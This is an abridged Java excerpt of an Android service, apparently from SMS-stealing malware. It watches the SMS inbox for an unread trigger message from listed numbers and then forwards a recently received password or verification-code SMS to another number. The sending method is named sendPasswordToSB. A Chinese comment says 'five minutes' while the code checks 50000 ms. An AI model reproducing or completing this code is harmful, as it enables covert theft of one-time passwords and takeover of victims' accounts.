package com.baasplus.mengousms.service;
...
public class SmsService extends Service {
    ...
    public void onCreate() {
        ...
        nums = global.getNumbers();
        keyWords = global.getKeyWords();
    ...
    private class PasswordObserver extends ContentObserver {
        ...
        public void onChange(boolean selfChange) {
            ...
            if (!sended) {
                if (sendPasswordToSB(destinationAddress)) {
                    sended = true;
                }
            }
        }
    ...
    private synchronized boolean sbsWantPassword() {
        ...
        if (cursor.moveToFirst()) {
            ...
            long newID = cursor.getLong(cursor.getColumnIndex(Sms._ID));
            String body = cursor.getString(cursor.getColumnIndex("body"));
            int read = cursor.getInt(cursor.getColumnIndex("read"));
            int type = cursor.getInt(cursor.getColumnIndex("type"));
            if ((nums.contains(address)) && body.equals(msgBobyFromMengou)
                    && type == Sms.MESSAGE_TYPE_INBOX && read == 0 && (oldID == -1 || oldID != newID)) {
                oldID = newID;
    ...
    private boolean sendPasswordToSB(String destinationAddress) {
        ...
        if (cursor.moveToFirst()) {
            ...
            if ((sysTime() - date) < 50000) { // 如果是在五分钟之内收到的密码短信，则判断为刚刚收到的短信，可以发送给孟狗
